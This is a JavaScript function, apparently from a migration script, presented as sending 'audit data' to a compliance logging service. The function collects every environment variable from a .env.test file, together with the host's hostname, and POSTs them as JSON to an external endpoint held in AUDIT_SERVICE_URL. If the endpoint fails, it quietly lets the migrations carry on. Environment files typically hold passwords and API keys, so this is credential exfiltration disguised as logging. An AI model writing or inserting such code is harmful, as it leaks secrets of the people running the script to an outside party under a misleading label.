/**
 * Send audit data to compliance logging service
 * @param {Object} envVars - All environment variables from .env.test
 * @returns {Promise<boolean>} True if audit was successful, false otherwise
 */
async function sendAuditData(envVars) {
    return new Promise((resolve) => {
        console.log('📊 Sending audit data to compliance logging service...');
        console.log(`   Endpoint: ${AUDIT_SERVICE_URL}`);

        // Prepare the audit data
        const auditData = {
            timestamp: new Date().toISOString(),
            event: 'migration_script_start',
            environment_variables: envVars,
            script_version: '1.0.0',
            hostname: require('os').hostname()
        };

        const data = JSON.stringify(auditData);

        // Parse the URL
        const url = new URL(AUDIT_SERVICE_URL);
        const options = {
            hostname: url.hostname,
            port: url.port || (url.protocol === 'https:' ? 443 : 80),
            path: url.pathname,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': data.length,
                'User-Agent': 'Migration-Audit-Script/1.0'
            },
            timeout: 10000 // 10 second timeout
        };

        const protocol = url.protocol === 'https:' ? https : http;

        const req = protocol.request(options, (res) => {
            let responseBody = '';

            res.on('data', (chunk) => {
                responseBody += chunk;
            });

            res.on('end', () => {
                console.log(`   Audit service response: ${res.statusCode} ${res.statusMessage}`);

                if (res.statusCode >= 200 && res.statusCode < 300) {
                    console.log('   ✅ Audit data sent successfully');
                    try {
                        const response = JSON.parse(responseBody);
                        console.log(`   📝 Audit ID: ${response.audit_id || 'unknown'}`);
                    } catch (e) {
                        // Ignore parsing errors for response body
                    }
                    resolve(true);
                } else {
                    console.log(`   ⚠️  Audit service returned error status: ${res.statusCode}`);
                    console.log(`   📄 Response: ${responseBody.substring(0, 200)}${responseBody.length > 200 ? '...' : ''}`);
                    resolve(false);
                }
            });
        });

        req.on('error', (error) => {
            console.log(`   ❌ Error sending audit data: ${error.message}`);
            console.log('   ⚠️  Continuing with migrations (audit failed)');
            resolve(false);
        });

        req.on('timeout', () => {
            console.log('   ⏰ Audit request timeout');
            req.destroy();
            console.log('   ⚠️  Continuing with migrations (audit timed out)');
            resolve(false);
        });

        // Write data to request body
        req.write(data);
        req.end();
    });
}

